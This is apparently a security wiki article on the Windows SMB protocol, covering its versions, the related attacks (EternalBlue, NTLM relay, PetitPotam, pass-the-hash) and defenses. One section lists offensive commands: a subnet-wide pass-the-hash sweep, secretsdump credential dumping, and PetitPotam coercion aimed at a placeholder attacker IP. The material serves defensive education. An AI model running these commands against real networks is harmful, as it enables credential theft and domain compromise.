---
title: SMB
slug: smb
category: protocols
summary: Server Message Block (SMB) is the Windows network file-sharing protocol, also used for named pipes, printer sharing, and inter-process communication on domain networks. SMB is one of the most-exploited Windows protocols — historic vulnerabilities (EternalBlue) and design primitives (NTLM relay, named pipes) make it central to Active Directory attack paths.
related: [active-directory, ntlm, pass-the-hash, kerberos, mimikatz]
aliases: [Server Message Block, CIFS, SMB1, SMB2, SMB3]
updated: 2026-05-25
---

**Server Message Block** (SMB) is the network file-sharing protocol native to Windows networks. It is also the carrier for named pipes, printer sharing, RPC-over-SMB, and several inter-process communication patterns Active Directory depends on. SMB started as a 1980s IBM/Microsoft design, evolved through CIFS, and is now at version SMB 3.1.1 on modern Windows.

SMB matters in security because it carries authentication. The protocol negotiates [NTLM](/wiki/ntlm) or [Kerberos](/wiki/kerberos) auth on connect; when an attacker can coerce a Windows host into an SMB connection back to them, the resulting hash (NTLMv2) is often relayable or crackable. That single primitive underlies a huge fraction of Active Directory attack chains.

## SMB versions

| Version | Year | Notable |
|---|---|---|
| **SMB 1** | 1996 | Legacy. Carrier of `EternalBlue` (MS17-010). Disabled by default in modern Windows. |
| **SMB 2** | Windows Vista / 2008 | Simplified command set, larger reads/writes. |
| **SMB 2.1** | Windows 7 / 2008 R2 | Performance improvements. |
| **SMB 3** | Windows 8 / 2012 | Encryption support, persistent handles for failover. |
| **SMB 3.1.1** | Windows 10 / 2016 | Pre-authentication integrity, AES-128-GCM, cipher negotiation. |

The default is SMB 3.1.1 negotiating down to a mutually-supported version. SMB1 should be **disabled everywhere** — both because of EternalBlue and because its authentication primitives leak NTLM hashes more readily.

## What SMB carries

| Layer | Examples |
|---|---|
| **File and printer sharing** | The `\\server\share` UNC paths and `\\server\printername`. |
| **Named pipes** | RPC and DCOM endpoints — most internal Windows admin tooling (`MS-SCMR`, `MS-WMI`, `MS-DRSR`) speaks pipes-over-SMB. |
| **Group Policy** | Workstations pull `\\sysvol\Policies\...` from domain controllers via SMB. |
| **Logon scripts** | `\\netlogon\...` via SMB. |
| **PsExec / WMI execution** | Both work by writing a service binary to `ADMIN$` (an SMB share on every Windows host) and starting it. |

This last point matters. `ADMIN$`, `C$`, and `IPC$` are hidden administrative shares on every domain-joined Windows host. Anyone who can authenticate as a local administrator can write files to `ADMIN$` and execute them — this is what `psexec.exe`, `wmiexec.py`, and [Metasploit](/wiki/metasploit)'s `psexec_psh` module rely on.

## SMB-related attacks

### Pass-the-Hash via SMB

The canonical [pass-the-hash](/wiki/pass-the-hash) chain: an attacker captures an NTLM hash on workstation A (via [Mimikatz](/wiki/mimikatz)) and uses it to authenticate to workstation B over SMB, then drops a payload to `\\B\ADMIN$\evil.exe` and executes it. Closed by [LAPS](/wiki/laps) (per-host unique passwords) and credential guard (which keeps hashes out of LSASS).

### EternalBlue (MS17-010)

A pre-authentication remote code execution vulnerability in SMB1, leaked from NSA tooling in 2017. WannaCry and NotPetya weaponized EternalBlue at global scale within months. The fix was MS17-010 — but the underlying lesson was "disable SMB1 entirely." Modern Windows ships with SMB1 disabled.

### NTLM Relay over SMB

An attacker positions themselves to receive an SMB authentication attempt from a victim, then relays it in real-time to a target server. The target validates the NTLM exchange against the victim's account, granting the attacker session-level access *as the victim* — without ever knowing the password.

Tools: `ntlmrelayx.py` (Impacket). Mitigations:

- **SMB signing required** — relays fail because the signed session expects the attacker to know the key, which they don't.
- **Extended Protection for Authentication (EPA)** on HTTPS endpoints.
- **Disable LLMNR / NBT-NS / mDNS** — the protocols that coerce victim machines into broadcasting auth attempts to attacker-controlled responders (`responder.py`).

### PrinterBug / SpoolSample

A primitive (Lee Christensen's `SpoolSample`) that forces any Windows host to authenticate to an attacker via the Print Spooler service over SMB/RPC. Combined with NTLM relay, it weaponizes coerced authentication. Mitigation: disable Print Spooler on domain controllers; patch with MS-RPRN / MS-RPC restrictions.

### PetitPotam (CVE-2021-36942)

A similar coercion using `EfsRpcOpenFileRaw` over the MS-EFSR named pipe — forces a DC to authenticate to an attacker, enabling relay to AD CS web enrollment for a domain takeover. Patched but variants continue to surface.

### SMB Ghost (CVE-2020-0796)

An SMBv3 compression-handling vulnerability allowing pre-authentication RCE on unpatched Windows 10 / Server 2019 hosts. Patched; named to evoke EternalBlue's lineage.

## What attackers do with SMB on a network

Standard offensive enumeration steps:

```bash
# Enumerate shares from an authenticated session
smbclient -L //target -U DOMAIN\\user

# Crack-the-hash + lateral move
crackmapexec smb 10.0.0.0/24 -u administrator -H aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

# Dump SAM/SECRETS over SMB
impacket-secretsdump DOMAIN/user:'pass'@target

# Coerce authentication
PetitPotam.py attacker_ip target_dc
```

## Defenses

| Control | Effect |
|---|---|
| **SMB signing required (workstations + servers)** | Defeats relay attacks. |
| **SMB encryption (SMB 3+)** | Confidentiality on the wire. Mandatory in some compliance regimes. |
| **Disable SMB1** | Removes EternalBlue / legacy NTLM-hash leak path. |
| **Disable LLMNR / NBT-NS / mDNS via Group Policy** | Stops attackers from poisoning name resolution to coerce SMB auth to themselves. |
| **Restrict outbound SMB at the firewall** | Defeats the "victim browses to attacker-controlled share" exfiltration path. |
| **Credential Guard** | Keeps NTLM hashes and Kerberos tickets out of LSASS, blocking [Mimikatz](/wiki/mimikatz). |
| **[LAPS](/wiki/laps)** | Per-host unique local-admin passwords — defeats pass-the-hash for SMB lateral movement. |
| **Detection on SMB lateral movement** | Alert on `psexec` / `wmiexec` patterns — service creation via `MS-SCMR` on a remote host, file writes to `ADMIN$`. |

## Further reading

- [Microsoft SMB protocol reference (MS-SMB2)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/).
- [Impacket toolkit — practical SMB attacks](https://github.com/fortra/impacket).
- [SpecterOps NTLM relay primer](https://specterops.io/blog/).
- [Active Directory Security — Sean Metcalf](https://adsecurity.org/) for SMB-adjacent AD attack chains.
